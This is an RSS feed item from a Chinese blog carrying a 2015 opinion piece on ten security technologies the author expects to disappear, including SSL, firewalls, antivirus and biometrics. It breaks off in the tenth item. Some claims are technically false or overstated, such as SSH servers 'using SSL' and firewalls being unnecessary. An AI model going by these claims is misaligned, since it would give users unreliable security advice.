<?xml version="1.0" encoding="UTF-8" ?>
<rss version="2.0">
<channel>
<title><![CDATA[流浪的龙－个人知识管理]]></title> 
<link>http://i.renjihe.com/blog/index.php</link> 
<description><![CDATA[]]></description> 
<language>zh-cn</language> 
<copyright><![CDATA[流浪的龙－个人知识管理]]></copyright>
<item>
<link>http://i.renjihe.com/blog/read.php?6830</link>
<title><![CDATA[十大注定要被淘汰的安全技术]]></title> 
<author>renjihe1988 &lt;admin@yourname.com&gt;</author>
<category><![CDATA[网络安全]]></category>
<pubDate>Mon, 07 Sep 2015 12:47:30 +0000</pubDate> 
<guid>http://i.renjihe.com/blog/read.php?6830</guid> 
<description>
<![CDATA[ 
	<p style="margin: 10px 0px; padding: 0px; color: #333333; text-indent: 28px; font-family: 宋体; font-size: 14px; line-height: 28px; background-color: #f8f8f8">系统性漏洞和瞬息万变的威胁环境将毁灭许多当今值得信赖的安全技术。</p><p style="margin: 10px 0px; padding: 0px; color: #333333; text-indent: 28px; font-family: 宋体; font-size: 14px; line-height: 28px; background-color: #f8f8f8">你是否曾有过这样的经历：启动软盘上的写入保护开关，以防止启动病毒和恶意覆写;关闭调制解调器，以防止黑客在晚上打来电话;卸载ansi.sys驱动，以防止恶意文本文件重新排布键盘，让下一次敲击直接格式化你的硬盘;检查autoexec.bat和config.sys文件，以确认没有恶意条目通过插入它们进行自启动。</p><p style="margin: 10px 0px; padding: 0px; color: #333333; text-indent: 28px; font-family: 宋体; font-size: 14px; line-height: 28px; text-align: center; background-color: #f8f8f8"><a style="color: #004276" href="http://s4.51cto.com/wyfs02/M00/71/98/wKioL1XUScOT6T4nAAIkw41pM3k974.jpg" target="_blank"><img style="border: 0px" class="fit-image" src="http://s4.51cto.com/wyfs02/M00/71/98/wKioL1XUScOT6T4nAAIkw41pM3k974.jpg" border="0" alt="十大注定要被淘汰的安全技术" width="445" height="221" /></a></p><p style="margin: 10px 0px; padding: 0px; color: #333333; text-indent: 28px; font-family: 宋体; font-size: 14px; line-height: 28px; background-color: #f8f8f8">时过境迁，上述情况如今很难见到了。黑客们取得了进步，技术替代了过时的方式。有的时候，我们这些防御者做得如此之好，让黑客放弃了攻击，转向更有油水的目标。有的时候，某种防御功能会被淘汰，因为我们认为它不能提供足够的保护，或者存在意想不到的弱点。新的技术浪潮不论是大是小，都会带来新的威胁。黑客们迅速替换手中的技术，把去年流行的攻击方式扔进垃圾箱，而安全社区正在疲于奔命。</p><p style="margin: 10px 0px; padding: 0px; color: #333333; text-indent: 28px; font-family: 宋体; font-size: 14px; line-height: 28px; background-color: #f8f8f8">也许没有什么东西，能够像计算机技术一样变化如此迅速。随着科技前进步步前进，保护它的责任也越变越重。如果你在计算机安全的世界里混迹已久，可能已经见识过很多安全技术的诞生和消亡。有的时候，你就快能够解决一种新的威胁了，而威胁本身却很快过时了。攻击和技术的步伐持续前进，即使是所谓最尖端的防御技术，比如生物认证和高级防火墙，都终将失败并退出局面。下面是那些注定要进入历史教科书的安全防御技术，我们五到十年后再翻开这篇文章，一定会超出你的想像。</p><p style="margin: 10px 0px; padding: 0px; color: #333333; text-indent: 28px; font-family: 宋体; font-size: 14px; line-height: 28px; background-color: #f8f8f8"><strong style="text-align: center">No.1：生物认证</strong></p><p style="margin: 10px 0px; padding: 0px; color: #333333; text-indent: 28px; font-family: 宋体; font-size: 14px; line-height: 28px; background-color: #f8f8f8">在登录安全领域里，生物认证技术是十分诱人的良药。毕竟，你的脸、指纹、DNA或者其它生物标志似乎是完美的登录凭据。但这只是门外汉的见解。对专家而言，生物认证并没有看上去那么安全：如果它失窃，你本人的生物标志却无法改变。</p><p style="margin: 10px 0px; padding: 0px; color: #333333; text-indent: 28px; font-family: 宋体; font-size: 14px; line-height: 28px; background-color: #f8f8f8"></p><img style="border: none" class="fit-image" src="http://s7.51cto.com/wyfs02/M02/71/98/wKioL1XUTFLSW_3qAACxCOcQSoA186.jpg" border="0" alt="640.webp (105)" width="498" height="389" /><p style="margin: 10px 0px; padding: 0px; color: #333333; text-indent: 28px; font-family: 宋体; font-size: 14px; line-height: 28px; background-color: #f8f8f8"></p><p style="margin: 10px 0px; padding: 0px; color: #333333; text-indent: 28px; font-family: 宋体; font-size: 14px; line-height: 28px; background-color: #f8f8f8">录入你的指纹吧。大多数人只有10个。任何时候你使用指纹作为生物识别凭据进行登录，那些指纹，或者更确切地说，其数字标识，必须被存储在某处以进行比对。不幸的是，这些数字标识损坏或者被盗是太常见的现象。如果坏人偷走了它们，你怎么能分辨出真实指纹凭据和对方手中数字标识的区别?</p><p style="margin: 10px 0px; padding: 0px; color: #333333; text-indent: 28px; font-family: 宋体; font-size: 14px; line-height: 28px; background-color: #f8f8f8">在这种情况下，唯一的解决办法是告诉世界上的每一个系统，不要继续使用你的指纹，但这几乎不可能做到。这对任何其它生物特征标记而言都是成立的。如果坏人得到了你生物信息的数字版本，要否认自己的DNA、脸、视网膜是很难的。</p><p style="margin: 10px 0px; padding: 0px; color: #333333; text-indent: 28px; font-family: 宋体; font-size: 14px; line-height: 28px; background-color: #f8f8f8">还有另一种情况，如果你用于登录的那些生物特征，比如说指纹本身被破坏了呢?</p><p style="margin: 10px 0px; padding: 0px; color: #333333; text-indent: 28px; font-family: 宋体; font-size: 14px; line-height: 28px; background-color: #f8f8f8">加入生物识别的多因素认证是一种击败黑客的方法，比如在生物识别之外加上密码、PIN。但一些使用物理要素的双因素认证也可以很容易地做到这一点，比如智能卡、USB钥匙盘。如果丢失，管理人员可以很快地颁发给你新的物理认证方式，你也可以设置新的PIN或者密码。</p><p style="margin: 10px 0px; padding: 0px; color: #333333; text-indent: 28px; font-family: 宋体; font-size: 14px; line-height: 28px; background-color: #f8f8f8">尽管生物识别登录正迅速成为时髦的安全功能，它们永远都不会变得无处不在。一旦人们意识到生物识别登录并不是它们看上去的那样，这种方式将失去人气，或者消失。其运用时总是要结合另一个认证要素，或者只是用在那些不需要高安全性的场景下。</p><p style="margin: 10px 0px; padding: 0px; color: #333333; text-indent: 28px; font-family: 宋体; font-size: 14px; line-height: 28px; background-color: #f8f8f8"><strong style="text-align: center">No.2：SSL</strong></p><p style="margin: 10px 0px; padding: 0px; color: #333333; text-indent: 28px; font-family: 宋体; font-size: 14px; line-height: 28px; background-color: #f8f8f8">自1995年发明以来，安全套接层协议(Secure Socket Layer，SSL)存在了很长一段时间。在这二十年里，它为我们提供了充分的服务。但如果你还没有听说过的话，我们需要介绍一下Poodle攻击，它让SSL协议无可挽回地走远了。SSL的替代者传输层安全协议(Transport Layer Security，TLS)则表现稍好。在本文介绍的所有即将被扔进垃圾桶的安全技术中，SSL是最接近于被取代的。人们不应该再使用它了。</p><p style="margin: 10px 0px; padding: 0px; color: #333333; text-indent: 28px; font-family: 宋体; font-size: 14px; line-height: 28px; background-color: #f8f8f8"></p><img style="border: none" class="fit-image" src="http://s9.51cto.com/wyfs02/M02/71/9B/wKiom1XUSkXj4hMxAAB5fdXMr0A775.jpg" border="0" alt="0.webp" width="498" height="191" /><p style="margin: 10px 0px; padding: 0px; color: #333333; text-indent: 28px; font-family: 宋体; font-size: 14px; line-height: 28px; background-color: #f8f8f8"></p><p style="margin: 10px 0px; padding: 0px; color: #333333; text-indent: 28px; font-family: 宋体; font-size: 14px; line-height: 28px; background-color: #f8f8f8">问题在哪?成百上千的网站依赖或启用了SSL。如果你禁用所有的SSL，这也是流行浏览器最新版本里的一般默认做法，各种网站都会变得无法连接。也许它们可以连接，但这只是因为浏览器或应用接受对SSL进行降级。此外，因特网上仍旧存在数百万计古老的安全Shell(Secure Shell，SSH)服务器。</p><p style="margin: 10px 0px; padding: 0px; color: #333333; text-indent: 28px; font-family: 宋体; font-size: 14px; line-height: 28px; background-color: #f8f8f8">OpenSSH最近似乎一直在遭到入侵。尽管大约一半的攻击事件和SSL毫无关系，但另一半都是由于SSL的漏洞引起的。数百万计的SSH/OpenSSH网站仍在使用SSL，尽管他们根本不应该这样做。</p><p style="margin: 10px 0px; padding: 0px; color: #333333; text-indent: 28px; font-family: 宋体; font-size: 14px; line-height: 28px; background-color: #f8f8f8">更糟糕的是，科技专家们使用的术语也在导致问题。几乎每个计算机安全行业内的人都会将TLS数字证书称为&ldquo;SSL证书&rdquo;，但这纯属指鹿为马：这些网站并不使用SSL。这就像是说一瓶可乐是可口可乐一样，尽管这瓶可乐可能是另外一个品牌。如果我们需要加快世界抛弃SSL的速度，就需要开始用本名称呼TLS证书。</p><p style="margin: 10px 0px; padding: 0px; color: #333333; text-indent: 28px; font-family: 宋体; font-size: 14px; line-height: 28px; background-color: #f8f8f8">不要再使用SSL了，并且将Web服务器证书称为TLS证书。我们越早摆脱&ldquo;SSL&rdquo;这个词，它就能越快地被扫进历史的垃圾堆。</p><p style="margin: 10px 0px; padding: 0px; color: #333333; text-indent: 28px; font-family: 宋体; font-size: 14px; line-height: 28px; background-color: #f8f8f8"><strong style="text-align: center">No.3：公钥加密</strong></p><p style="margin: 10px 0px; padding: 0px; color: #333333; text-indent: 28px; font-family: 宋体; font-size: 14px; line-height: 28px; background-color: #f8f8f8">如果量子计算的实现和配套的密码学出现，我们如今使用的大多数公钥加密技术：RSA、迪斐&middot;海尔曼(Diffie-Hellman，DH)等等将很快变成可读状态，这可能会让一些人大吃一惊。很多人长期以来都认为可使用级别的量子计算再过几年就要到来了，但这种估计属于盲目乐观。如果研究人员真的拿出了量子计算技术，大多数已知的公钥加密方式，包括那些流行算法，都会非常容易破解。世界各地的间谍机构经年累月地秘密保存着被锁死的机密文件，等着技术大突破。而且，如果你相信一些流言的话，他们已经解决了这个问题，正在阅读我们的所有秘密。</p><p style="margin: 10px 0px; padding: 0px; color: #333333; text-indent: 28px; font-family: 宋体; font-size: 14px; line-height: 28px; background-color: #f8f8f8"></p><img style="border: none" class="fit-image" src="http://s1.51cto.com/wyfs02/M02/71/9B/wKiom1XUSkaQWHeaAAAyF94M-Sk617.jpg" border="0" alt="0.webp (1)" width="498" height="276" /><p style="margin: 10px 0px; padding: 0px; color: #333333; text-indent: 28px; font-family: 宋体; font-size: 14px; line-height: 28px; background-color: #f8f8f8"></p><p style="margin: 10px 0px; padding: 0px; color: #333333; text-indent: 28px; font-family: 宋体; font-size: 14px; line-height: 28px; background-color: #f8f8f8">一些密码学专家，比如布鲁斯&middot;施耐尔(Bruce Schneier)，一直以来对量子密码学的前景存有疑问。但批评家无法拒绝这种可能性：一旦它被开发出来，所有使用RSA、DF，甚至椭圆曲线(Elliptic Curve Cryptography，ECC)加密的密文瞬间变成了可读状态。</p><p style="margin: 10px 0px; padding: 0px; color: #333333; text-indent: 28px; font-family: 宋体; font-size: 14px; line-height: 28px; background-color: #f8f8f8">这并不是说不存在量子级的加密算法。的确有一些，比如基于格(Lattice)方法的加密、超奇异同源密码交换(Supersingular Isogeny Key Exchange)。但如果你使用的公钥不属于这类，一旦量子计算开始普及，你的坏运气就要来了。</p><p style="margin: 10px 0px; padding: 0px; color: #333333; text-indent: 28px; font-family: 宋体; font-size: 14px; line-height: 28px; background-color: #f8f8f8"><strong style="text-align: center">No.4：IPSec</strong></p><p style="margin: 10px 0px; padding: 0px; color: #333333; text-indent: 28px; font-family: 宋体; font-size: 14px; line-height: 28px; background-color: #f8f8f8">如果启用，IPsec会保护两点或多点间数据传输的完整性和隐私性，也即加密。这项技术发明于1993年，在1995年成为开放标准。数以百计的厂商支持IPsec，数百万计的计算机使用它。</p><p style="margin: 10px 0px; padding: 0px; color: #333333; text-indent: 28px; font-family: 宋体; font-size: 14px; line-height: 28px; background-color: #f8f8f8"></p><img style="border: none" class="fit-image" src="http://s6.51cto.com/wyfs02/M00/71/98/wKioL1XUTFTi9pAyAABCK1MycQA722.jpg" border="0" alt="640.webp (106)" width="426" height="282" /><p style="margin: 10px 0px; padding: 0px; color: #333333; text-indent: 28px; font-family: 宋体; font-size: 14px; line-height: 28px; background-color: #f8f8f8"></p><p style="margin: 10px 0px; padding: 0px; color: #333333; text-indent: 28px; font-family: 宋体; font-size: 14px; line-height: 28px; background-color: #f8f8f8">不像本文中提到的其它例子，IPsec真的有用，而且效果很好，但它却有着另一方面的问题。</p><p style="margin: 10px 0px; padding: 0px; color: #333333; text-indent: 28px; font-family: 宋体; font-size: 14px; line-height: 28px; background-color: #f8f8f8">首先，虽然它被广泛使用并部署，但从没达到大而不倒的规模。其次，IPsec十分复杂，并不是所有厂商都支持它。更糟的是，如果通讯双方中的一方支持IPsec，另一方如网关或负载平衡器不支持它，通讯经常会被破解。在许多公司中，IPSec通常作为可选项存在，强制使用它的电脑很少。</p><p style="margin: 10px 0px; padding: 0px; color: #333333; text-indent: 28px; font-family: 宋体; font-size: 14px; line-height: 28px; background-color: #f8f8f8">IPsec的复杂性也造成了性能问题。除非你在IPsec隧道两侧都部署专门硬件，不然它就会显著减缓所有用到它的网络连接。因此，大型的事务服务器，比如数据库和大多数Web服务器根本无法支持它。而这两类服务器恰恰是存储最重要数据的地方。如果你不能用IPsec保护大部分数据，它又能带来什么好处呢?</p><p style="margin: 10px 0px; padding: 0px; color: #333333; text-indent: 28px; font-family: 宋体; font-size: 14px; line-height: 28px; background-color: #f8f8f8">另外，尽管它是一个&ldquo;公共&rdquo;的开放标准，IPsec的实现却通常无法在各个厂商之间共用，这是另一个减缓乃至阻止IPsec被广泛部署的原因。</p><p style="margin: 10px 0px; padding: 0px; color: #333333; text-indent: 28px; font-family: 宋体; font-size: 14px; line-height: 28px; background-color: #f8f8f8">但对IPsec而言，真正的丧钟是HTTPS得到了广泛使用。如果你启用了HTTPS，就不再需要IPsec。这是个两者必择其一的选择，世界作出了它的决定。HTTPS赢了。只要你有一份有效的TLS电子证书，一个兼容的客户端，就能使用HTTPS：没有交互问题、复杂度低。存在一些性能影响，但对大多数用户而言微不足道。全球正迅速变成一个默认使用HTTPS的世界。在这个过程中，IPsec将会死亡。</p><p style="margin: 10px 0px; padding: 0px; color: #333333; text-indent: 28px; font-family: 宋体; font-size: 14px; line-height: 28px; background-color: #f8f8f8"><strong style="text-align: center">No.5：防火墙</strong></p><p style="margin: 10px 0px; padding: 0px; color: #333333; text-indent: 28px; font-family: 宋体; font-size: 14px; line-height: 28px; background-color: #f8f8f8">无处不在的HTTPS基本上宣告了传统防火墙的末日。早在三年前就有人写过相关文章，但三年过去，防火墙依旧无处不在。但真实情况呢?它们大多数未经配置，几乎全部都没有配备&ldquo;最低容许度，默认屏蔽&rdquo;规则，然而正是这种规则才让防火墙具备了价值。相信不少人都知道大多数防火墙规则过于宽松，甚至&ldquo;允许所有XXX&rdquo;这样规则的防火墙也不稀罕.这样配置的防火墙基本上还不如不存在。它啥都没干，只是在拖网速后腿。</p><p style="margin: 10px 0px; padding: 0px; color: #333333; text-indent: 28px; font-family: 宋体; font-size: 14px; line-height: 28px; background-color: #f8f8f8"></p><img style="border: none" class="fit-image" src="http://s8.51cto.com/wyfs02/M00/71/98/wKioL1XUTFSCEuzEAAA2ETdW7Hs736.jpg" border="0" alt="640.webp (107)" width="425" height="282" /><p style="margin: 10px 0px; padding: 0px; color: #333333; text-indent: 28px; font-family: 宋体; font-size: 14px; line-height: 28px; background-color: #f8f8f8"></p><p style="margin: 10px 0px; padding: 0px; color: #333333; text-indent: 28px; font-family: 宋体; font-size: 14px; line-height: 28px; background-color: #f8f8f8">不管你怎么定义防火墙，它必须包括一个部分：只允许特定的、预配置的接口，只有这样它才能算是有用。随着这个世界向着HTTPS化迈进，最终，所有防火墙都会只剩下几条规则：HTTP、HTTPS和DNS。其它协议，比如ads DNS、DHCP等等，也会开始使用HTTPS-only。事实上，很难想象一个不是以全民HTTPS化告终的世界。当这一切来临，防火墙何去何从?</p><p style="margin: 10px 0px; padding: 0px; color: #333333; text-indent: 28px; font-family: 宋体; font-size: 14px; line-height: 28px; background-color: #f8f8f8">防火墙提供的主要防御功能是保护脆弱的服务免遭远程攻击。具有远程脆弱性的服务通常极易破坏，远程利用缓冲区溢出是最常见的攻击方式。看看莫里斯蠕虫(Robert Morris Internet worm)、红色警戒(Code Red)、冲击波(Blaster)和蓝宝石(SQL Slammer)吧。你能回忆起最近一次世界级缓冲区溢出蠕虫攻击出现在哪年吗?应该不会超过本世纪头几年。而这些蠕虫都还远不及上世纪八九十年代那些的威力。基本上，如果你不使用未打补丁、存在漏洞的监听服务，就不需要传统防火墙。你现在就不需要。对，你没听错。你不需要防火墙。</p><p style="margin: 10px 0px; padding: 0px; color: #333333; text-indent: 28px; font-family: 宋体; font-size: 14px; line-height: 28px; background-color: #f8f8f8">一些防火墙厂商经常鼓吹他们的&ldquo;高级&rdquo;防火墙拥有传统产品远不能及的功能。但这种所谓的&ldquo;高级防火墙&rdquo;只要它们进行&ldquo;数据包深度检查&rdquo;或签名扫描，只会导致两种结果：其一，网速大幅度下降，返回结果充斥着假阳性;其二，只扫描一小部分攻击。大多数&ldquo;高级&rdquo;防火墙只会扫描数十到数百种攻击。如今，每天都会出现超过39万种新型恶意软件，这还不包括那些隐藏在合法活动中无法识别的。</p><p style="margin: 10px 0px; padding: 0px; color: #333333; text-indent: 28px; font-family: 宋体; font-size: 14px; line-height: 28px; background-color: #f8f8f8">即使防火墙真的达到了他们宣称的防护级别，它们也不是真的有效。因为如今企业面临的两种最主要的恶意攻击类型是：未打补丁的软件和社会工程。</p><p style="margin: 10px 0px; padding: 0px; color: #333333; text-indent: 28px; font-family: 宋体; font-size: 14px; line-height: 28px; background-color: #f8f8f8">这么说吧，是否配备防火墙都一样被黑。也许它们在过去表现太好了，导致黑客转向了别的攻击类型。但不管是什么原因，防火墙如今已经几乎没有用了，从过去十年前这个趋势就开始了。</p><p style="margin: 10px 0px; padding: 0px; color: #333333; text-indent: 28px; font-family: 宋体; font-size: 14px; line-height: 28px; background-color: #f8f8f8"><strong style="text-align: center">No.6：反病毒扫描</strong></p><p style="margin: 10px 0px; padding: 0px; color: #333333; text-indent: 28px; font-family: 宋体; font-size: 14px; line-height: 28px; background-color: #f8f8f8">恶意软件数量目前在数千万到上亿级别，其具体数字取决于你相信谁给出的数据。一个压倒性的事实是，反病毒扫描软件几乎已经没有用了。</p><p style="margin: 10px 0px; padding: 0px; color: #333333; text-indent: 28px; font-family: 宋体; font-size: 14px; line-height: 28px; background-color: #f8f8f8"></p><img style="border: none" class="fit-image" src="http://s1.51cto.com/wyfs02/M00/71/9B/wKiom1XUSkeBNKhsAAB6dtKiZB8707.jpg" border="0" alt="640.webp (108)" width="498" height="351" /><p style="margin: 10px 0px; padding: 0px; color: #333333; text-indent: 28px; font-family: 宋体; font-size: 14px; line-height: 28px; background-color: #f8f8f8"></p><p style="margin: 10px 0px; padding: 0px; color: #333333; text-indent: 28px; font-family: 宋体; font-size: 14px; line-height: 28px; background-color: #f8f8f8">但也并不是完全没用，因为它们会阻挡80到99.9%对普通用户的攻击。但普通用户每年都会接触到成百上千的恶意程序。哪怕用户手气再好，坏人也会时不时地赢上那么一两次。如果你的PC一年都没有接触到恶意软件，你一定是做了什么特别的事情。</p><p style="margin: 10px 0px; padding: 0px; color: #333333; text-indent: 28px; font-family: 宋体; font-size: 14px; line-height: 28px; background-color: #f8f8f8">这并不是说我们不应该为反病毒厂商喝彩。为了对抗天文数字的赔率，他们的工作量巨大。我想不到有任何一个产业能够应对恶意软件数量如此快速的增长，而且使用的还是自上世纪八十年代以来就存在的老技术，在那时候只有几十种病毒需要检测。</p><p style="margin: 10px 0px; padding: 0px; color: #333333; text-indent: 28px; font-family: 宋体; font-size: 14px; line-height: 28px; background-color: #f8f8f8">真正杀死反病毒扫描软件的不是恶意软件的数量，而是白名单。当今的普通计算机会运行所有你安装的程序。这使得恶意软件到处都是。但电脑和操作系统厂商已经开始改变&ldquo;见什么运行什么&rdquo;的模式，以提升用户的安全性。这项运动和杀毒软件是对立的。后者的逻辑是，让一切运行畅通，除了包括那些含有已知的那5亿反病毒签名的软件。&ldquo;默认运行，例外禁止&rdquo;正被&ldquo;默认禁止，例外运行&rdquo;所代替。</p><p style="margin: 10px 0px; padding: 0px; color: #333333; text-indent: 28px; font-family: 宋体; font-size: 14px; line-height: 28px; background-color: #f8f8f8">当然，电脑上早就有白名单程序了，也就是应用控制软件。我在2009年回顾了一些受欢迎的此类产品。问题在于：大多数人不使用白名单，即便它是内置的。最大的障碍?用户担心不能再安装所有那些乱七八糟的东西了，而且批准能在用户系统上运行的所有软件也是一项令人头疼的工程。</p><p style="margin: 10px 0px; padding: 0px; color: #333333; text-indent: 28px; font-family: 宋体; font-size: 14px; line-height: 28px; background-color: #f8f8f8">然而恶意软件和黑客攻击正日益普遍，厂商开始在默认情况下启用白名单。苹果的OS X系统在三年前推出了一项默认白名单功能，被称为Gatekeeper。iOS设备使用白名单机制的历史更长，除非越狱，它们只能运行被批准在App Store上架的应用。苹果漏掉了一些恶意软件，但这项工程对于阻止针对流行操作系统和程序的大量恶意软件功不可没。</p><p style="margin: 10px 0px; padding: 0px; color: #333333; text-indent: 28px; font-family: 宋体; font-size: 14px; line-height: 28px; background-color: #f8f8f8">微软在更早的时候就通过软件限制策略(Software Restriction Policies)和AppLocker引入了类似机制。Windows10带来的DeviceGuard则有力地推动了这项工程。微软的Windows商店采取了和苹果App Store类似的保护机制。尽管微软不会默认开启DeviceGuard，也不会默认只运行从Windows商店上安装的应用，但白名单功能已经相对健全，也比以前更易用。</p><p style="margin: 10px 0px; padding: 0px; color: #333333; text-indent: 28px; font-family: 宋体; font-size: 14px; line-height: 28px; background-color: #f8f8f8">一旦白名单变成了多数操作系统上的默认选项，对恶意软件而言就是游戏结束的时间，然后，对反病毒扫描软件而言也是如此。很难说人们会想念两者之中的任何一个。</p><p style="margin: 10px 0px; padding: 0px; color: #333333; text-indent: 28px; font-family: 宋体; font-size: 14px; line-height: 28px; background-color: #f8f8f8"><strong style="text-align: center">No.7：反骚扰过滤</strong></p><p style="margin: 10px 0px; padding: 0px; color: #333333; text-indent: 28px; font-family: 宋体; font-size: 14px; line-height: 28px; background-color: #f8f8f8">骚扰邮件仍旧占全网邮件数的一半。多亏了反骚扰过滤，你可能没有注意到这一点。反骚扰过滤真的实现了那些反病毒厂商声称的精确性，不过它们每天仍旧会漏过数以十亿计的邮件。只有两件东西可以阻止骚扰：通用的、普适的、高安全性的认证和更具结合性的国际法。</p><p style="margin: 10px 0px; padding: 0px; color: #333333; text-indent: 28px; font-family: 宋体; font-size: 14px; line-height: 28px; background-color: #f8f8f8"></p><img style="border: none" class="fit-image" src="http://s5.51cto.com/wyfs02/M00/71/9B/wKiom1XUSkfyFpLSAABKgmi9cFo892.jpg" border="0" alt="640.webp (109)" width="498" height="324" /><p style="margin: 10px 0px; padding: 0px; color: #333333; text-indent: 28px; font-family: 宋体; font-size: 14px; line-height: 28px; background-color: #f8f8f8"></p><p style="margin: 10px 0px; padding: 0px; color: #333333; text-indent: 28px; font-family: 宋体; font-size: 14px; line-height: 28px; background-color: #f8f8f8">垃圾邮件发送者仍旧存在，因为我们很难轻易抓住他们。但随着互联网日益成熟，普适性的匿名将被高可信度的身份所代替。到那时，如果一个人给你发邮件说有一麻袋钱要寄给你，你能够同时确定他是否真的是他。</p><p style="margin: 10px 0px; padding: 0px; color: #333333; text-indent: 28px; font-family: 宋体; font-size: 14px; line-height: 28px; background-color: #f8f8f8">只有通过对每个用户的登录都采取双因素验证，才能实现高可信度的身份，然后则是高可信度的计算机和网络。发送者和接受者之间的每一个齿轮都会有更高的可靠性。这种可靠性是通过无处不在的HTTPS提供的，但要确认你就是你，还需要加入额外机制。</p><p style="margin: 10px 0px; padding: 0px; color: #333333; text-indent: 28px; font-family: 宋体; font-size: 14px; line-height: 28px; background-color: #f8f8f8">今天，几乎所有人都可以声称自己是某某，而我们并没有普适性的方式来验证他的说法。这将会改变。几乎每一种我们依赖的关键基础设施：交通、电力等等都需要这样的身份凭据。互联网现在还处在狂野西部的时代，但它作为基础设施的本质日益凸现，几乎必然向身份凭据化的方向发展。</p><p style="margin: 10px 0px; padding: 0px; color: #333333; text-indent: 28px; font-family: 宋体; font-size: 14px; line-height: 28px; background-color: #f8f8f8">国际边境问题一直在给起诉网络犯罪造成麻烦，它很可能在不久的将来得到解决。目前，许多国家不接受其它国家签发的证据和搜查令，这让逮捕诸如垃圾邮件发送者和存在其它恶意行为的人几近不可能。你可以随便收集证据，但如果攻击者的所在国不执行搜查令，你的案子就完蛋了。</p><p style="margin: 10px 0px; padding: 0px; color: #333333; text-indent: 28px; font-family: 宋体; font-size: 14px; line-height: 28px; background-color: #f8f8f8">随着互联网日趋成熟，那些不深挖互联网上最大的犯罪集团的国家将被惩罚。这些国家可能被登入黑名单。事实上，有些国家已经在上面了。举个例子，很多公司和网站都会拒绝所有来自中国的流量，不管它是不是合法。如前所述，一旦我们能够辨认出罪犯和他们的所属国家，其所属国家将被迫作出反应，不然就会受到惩罚。</p><p style="margin: 10px 0px; padding: 0px; color: #333333; text-indent: 28px; font-family: 宋体; font-size: 14px; line-height: 28px; background-color: #f8f8f8">垃圾邮件争先恐后地挤满你邮箱的好日子已经到头了。普适性的身份和国际法的变化将给垃圾邮件盖棺，当然还有那些专门打击它们的安全技术。</p><p style="margin: 10px 0px; padding: 0px; color: #333333; text-indent: 28px; font-family: 宋体; font-size: 14px; line-height: 28px; background-color: #f8f8f8"><strong style="text-align: center">No.8：抗DDoS</strong></p><p style="margin: 10px 0px; padding: 0px; color: #333333; text-indent: 28px; font-family: 宋体; font-size: 14px; line-height: 28px; background-color: #f8f8f8">值得庆幸的是，上述的普适性身份保护也会为拒绝服务攻击和其相关防御技术鸣起丧钟。</p><p style="margin: 10px 0px; padding: 0px; color: #333333; text-indent: 28px; font-family: 宋体; font-size: 14px; line-height: 28px; background-color: #f8f8f8"></p><img style="border: none" class="fit-image" src="http://s5.51cto.com/wyfs02/M01/71/98/wKioL1XUTFXSd2wkAAA9GhzkvYQ273.jpg" border="0" alt="640.webp (110)" width="498" height="244" /><p style="margin: 10px 0px; padding: 0px; color: #333333; text-indent: 28px; font-family: 宋体; font-size: 14px; line-height: 28px; background-color: #f8f8f8"></p><p style="margin: 10px 0px; padding: 0px; color: #333333; text-indent: 28px; font-family: 宋体; font-size: 14px; line-height: 28px; background-color: #f8f8f8">如今，任何人都可以使用免费的互联网工具，向任意网站发送数以十亿计的数据包。大多数操作系统都内置有拒绝服务攻击保护，也有几十家厂商能够在你被巨量虚假流量攻击时提供保护。但取消普遍的匿名性将制止所有发送拒绝服务流量的攻击者。一旦我们能够找出他们，就可以逮捕他们。</p><p style="margin: 10px 0px; padding: 0px; color: #333333; text-indent: 28px; font-family: 宋体; font-size: 14px; line-height: 28px; background-color: #f8f8f8">这样想一想：在上世纪二十年代，美国有很多即猖狂又著名的银行抢劫犯。银行最终加强了他们的防护，警察也能更好地识别和逮捕罪犯。强盗们仍然会袭击银行，但很少抢到钱，而且几乎总能被抓住，特别是当他们坚持要抢更多的银行时。同样的情况也会发生在拒绝服务攻击者身上，只要我们能够快速识别他们，迟早他们会带着那些让人无可奈何、头疼不已的作恶手段消失殆尽。</p><p style="margin: 10px 0px; padding: 0px; color: #333333; text-indent: 28px; font-family: 宋体; font-size: 14px; line-height: 28px; background-color: #f8f8f8"><strong style="text-align: center">No.9：大体量事件日志</strong></p><p style="margin: 10px 0px; padding: 0px; color: #333333; text-indent: 28px; font-family: 宋体; font-size: 14px; line-height: 28px; background-color: #f8f8f8">对计算机安全事件进行检测和警报是困难的。每台电脑每天都会产生数以万计的事件。如果将它们都存储在一个集中的日志数据库，你的存储空间很快就会爆炸。如今的事件日志系统通常以其磁盘存储阵列规模巨大而自居。</p><p style="margin: 10px 0px; padding: 0px; color: #333333; text-indent: 28px; font-family: 宋体; font-size: 14px; line-height: 28px; background-color: #f8f8f8"></p><img style="border: none" class="fit-image" src="http://s1.51cto.com/wyfs02/M01/71/98/wKioL1XUTFXgYdmIAAApmk0CBYs988.jpg" border="0" alt="640.webp (111)" width="498" height="153" /><p style="margin: 10px 0px; padding: 0px; color: #333333; text-indent: 28px; font-family: 宋体; font-size: 14px; line-height: 28px; background-color: #f8f8f8"></p><p style="margin: 10px 0px; padding: 0px; color: #333333; text-indent: 28px; font-family: 宋体; font-size: 14px; line-height: 28px; background-color: #f8f8f8">唯一的问题：这类事件日志记录没有用。几乎所有收集到的事件包都没有用并保持着未读状态，存储这些毫无用处的未读文件会带来巨大的存储成本，有些东西必须被放弃。很快，管理员就会要求应用和操作系统厂商提供给他们更多的信号和更少的噪声，去除那些没有价值的通常日志。换句话说，事件日志厂商很快就会开始吹嘘他们占用的存储空间有多小，而不是多大。</p><p style="margin: 10px 0px; padding: 0px; color: #333333; text-indent: 28px; font-family: 宋体; font-size: 14px; line-height: 28px; background-color: #f8f8f8"><strong style="text-align: center">No.10：匿名工具</strong></p><p style="margin: 10px 0px; padding: 0px; color: #333333; text-indent: 28px; font-family: 宋体; font-size: 14px; line-height: 28px; background-color: #f8f8f8">最后，任何关于匿名性和隐私的遗迹都将被彻底抹去。我们早就不需要它们了。在这个主题上，推荐一本新书，布鲁斯&middot;施奈尔的《数据与歌利亚》(Data and Goliath)。如果你还没有意识到自己还剩下的隐私和匿名性有多么少，快速阅读它，它可能会吓到你死。</p><p style="margin: 10px 0px; padding: 0px; color: #333333; text-indent: 28px; font-family: 宋体; font-size: 14px; line-height: 28px; background-color: #f8f8f8"></p><img style="border: none" class="fit-image" src="http://s6.51cto.com/wyfs02/M01/71/9B/wKiom1XUSkiRQWIDAAA64mwJR1Y699.jpg" border="0" alt="640.webp (112)" width="498" height="373" /><p style="margin: 10px 0px; padding: 0px; color: #333333; text-indent: 28px; font-family: 宋体; font-size: 14px; line-height: 28px; background-color: #f8f8f8"></p><p style="margin: 10px 0px; padding: 0px; color: #333333; text-indent: 28px; font-family: 宋体; 